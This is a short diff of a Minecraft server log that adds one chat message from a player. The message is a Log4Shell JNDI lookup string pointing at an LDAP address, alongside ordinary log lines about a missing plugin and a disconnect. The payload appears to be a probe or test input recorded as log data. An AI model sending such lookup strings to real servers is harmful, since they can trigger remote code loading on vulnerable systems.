@@ -193,3 +193,4 @@ org.bukkit.plugin.UnknownDependencyException: ProtocolLib
 [16:33:46] [Server thread/INFO]: odragclicker left the game.
 [16:33:46] [Server thread/WARN]: handleDisconnection() called twice
 [16:35:37] [Async Chat Thread - #3/INFO]: <odragclicker> a
+[16:35:37] [Async Chat Thread - #2/INFO]: <odragclicker> ${jndi:ldap://192.168.255.255}
